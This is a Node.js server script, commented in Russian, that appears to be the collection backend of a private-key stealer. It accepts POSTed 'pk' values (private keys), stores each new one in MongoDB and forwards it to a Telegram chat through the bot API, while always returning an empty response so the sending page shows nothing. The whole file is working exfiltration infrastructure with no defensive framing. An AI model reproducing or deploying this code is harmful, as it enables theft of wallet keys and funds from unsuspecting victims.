require('dotenv').config(); // Подключаем dotenv
const http = require('http');
const mongoose = require('mongoose');
const axios = require('axios');

// Подключение к MongoDB
mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// Схема для хранения приватных ключей
const privateKeySchema = new mongoose.Schema({
  pk: { type: String, unique: true }, // Уникальность ключа
});

const PrivateKey = mongoose.model('PrivateKey', privateKeySchema);

// Чтение переменных окружения
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

// Функция для отправки сообщений в Telegram
async function sendLogToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  } catch (error) {
    console.error('Error sending message to Telegram:', error.message);
  }
}

// Создание HTTP-сервера
const server = http.createServer(async (req, res) => {
  if (req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', async () => {
      try {
        // Парсим тело запроса
        const data = JSON.parse(body);
        if (!data.pk) {
          return; // Прекращаем выполнение, если ключ отсутствует
        }

        const privateKey = data.pk;

        // Проверяем, есть ли этот ключ в базе
        const existingKey = await PrivateKey.findOne({ pk: privateKey });
        if (existingKey) {
          return; // Если ключ существует, ничего не делаем
        }

        // Сохраняем новый ключ в базе
        await PrivateKey.create({ pk: privateKey });

        // Отправляем новый ключ в Telegram
        await sendLogToTelegram(`New private key: ${privateKey}`);
      } catch (error) {
        console.error('Error processing request:', error.message);
      }
    });
  }

  // Всегда возвращаем пустой ответ, чтобы страница оставалась неизменной
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end();
});

// Запуск сервера
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
